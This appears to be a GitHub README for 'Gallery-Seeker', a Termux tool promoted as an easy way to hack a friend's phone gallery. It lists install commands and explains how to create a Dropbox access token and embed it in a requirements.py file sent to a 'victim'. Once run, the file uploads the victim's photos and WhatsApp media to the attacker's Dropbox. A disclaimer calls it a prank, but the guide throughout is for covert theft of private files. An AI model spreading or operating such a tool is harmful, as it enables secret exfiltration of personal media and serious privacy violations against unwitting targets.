<h1><p align= "center">Gallery-Seeker V1.5</p></h1>
<h3><p align= "center">The Easiest Way To Gallery Hacking </p></h3><br>

<h4><p align = "center">* Tool By John Kener * <p><h4>
<div>  
<p align= "center">
<img src="https://www.udrop.com/file/5HFB/IMG_20210511_073611_429.jpg",width="80", height="80",alt="john-kener"/>
</p>
<br />
<hr />
<p align="center">
Contact Me On <br><br>
<a href="https://www.facebook.com/profile.php?id=100057560824177"><img title="Facebook" src="https://img.shields.io/badge/Facebook-red?style=for-the-badge&logo=facebook"></a>
<a href="https://t.me/John_kener"><img title="Telegram " src="https://img.shields.io/badge/Telegram-red?style=for-the-badge&logo=telegram"></a>
<a href="https://wa.me/+94788655161"><img title="Whatsapp" src="https://img.shields.io/badge/WHATSAPP -red?style=for-the-badge&logo=whatsapp"></a>
</br>
<hr />
<p align="center">
<img src="https://github.com/John-kener/Gallery-Seeker/blob/main/Seeker.jpg" alt="Tool Home Image " width="260" height="260"/>
</p>
</div>

<hr />

### >> AVAILABLE ON :

* Termux
* Any Terminal That can run python2 and python3

### >> TESTED ON :

* Termux

#### >> VICTIM MUST BE A TERMUX USER

<hr>



<hr>
<h2><p align = "left">[+] Account Setup </p></h2>
	


➽ Creating An Account : https://www.dropbox.com/account


➽ Getting Access Tokens : https://www.dropbox.com/developers/apps/create?_tk=pilot_lp&_ad=ctabtn1&_camp=create


➽ Cloud Storage (Home) : https://www.dropbox.com/h

<h2><p align = "left">[+] Command List</p></h2>
	
	
<div align ="left">
	
```pkg update && pkg upgrade```
   
```pkg install python -y ```
    
```pkg install python2 -y ```
        
```pkg intall git -y ```
        
```git clone https://github.com/john-kener/Gallery-Seeker ```
        
```cd Gallery-Seeker ```
        
```python Seeker-req.py ```
        
```python Gallery-seeker.py ```
        
###### [-] Create the ```requirements.py``` file using your dropbox access token...

###### [-] And Send it to your victim ...

</div>
	
<hr />

## [#] INSTRUCTIONS
	(1) USE THIS TOOL CAREFULLY 

	(2) The creator assumes no responsibility

	    for any misuse of this product

	(3) This was made only for fun & pranking,

	    Using this for harmful activities ,

	    can cause you to get into legal troubles.

	     
## [#] IMPORTANT
	
	(1) You Can select your own method to ha*k
	    your friend's gallery , To ha*k your friend's 
	    Whatsapp mod media ,You must know
	    about the base of his whatsapp.
	
	(2) Getting all of the gallery will get much time ,
	    so target only one method to ha*k his gallery.
	
	(3) His connection speed will decide how much
	    time it will take to upload his
	    gallery items to your dropbox account .

#### © 2021 -John kener & SCW team


<hr />
<hr />
